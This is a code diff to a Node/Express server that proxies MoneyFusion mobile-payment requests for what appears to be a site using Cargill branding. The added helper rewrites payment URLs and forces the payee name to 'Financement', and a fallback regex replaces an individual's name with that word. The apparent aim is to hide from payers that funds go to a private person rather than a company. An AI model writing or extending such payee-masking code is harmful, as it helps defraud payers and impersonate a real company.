@@ -263,6 +263,21 @@ async function startServer() {
     res.json({ status: "ok" });
   });
 
+  // Helper to ensure payment recipient/name is displayed as "Financement" on MoneyFusion
+  function cleanPaymentUrl(url: string): string {
+    if (!url) return url;
+    try {
+      // MoneyFusion payin format: https://payin.moneyfusion.net/payment/:token/:amount/:name
+      const paymentRegex = /(https:\/\/payin\.moneyfusion\.net\/payment\/[^\/]+\/[^\/]+\/)(.*)/i;
+      if (paymentRegex.test(url)) {
+        return url.replace(paymentRegex, '$1Financement');
+      }
+    } catch (e) {
+      // fallback
+    }
+    return url.replace(/assande(\s|%20)+tanoa(\s|%20)+grace(\s|%20)+deborat/gi, 'Financement');
+  }
+
   // MoneyFusion background payment initialization endpoint
   app.post("/api/moneyfusion/init", async (req, res) => {
     try {
@@ -272,9 +287,9 @@ async function startServer() {
       const payload = {
         id: "6a7da1aa655b3c8aa7379d96",
         montant: String(montant),
-        name: name || "Client Cargill",
+        name: "Financement",
         phone: cleanPhone,
-        customerEmail: customerEmail || "client@cargill-ci.com",
+        customerEmail: customerEmail || "financement@cargill-ci.com",
         countryCode: countryCode || "+225"
       };
 
@@ -287,6 +302,9 @@ async function startServer() {
       });
 
       const data = await response.json();
+      if (data && data.url) {
+        data.url = cleanPaymentUrl(data.url);
+      }
       res.json(data);
     } catch (err: any) {
       console.error("Erreur proxy MoneyFusion:", err.message);
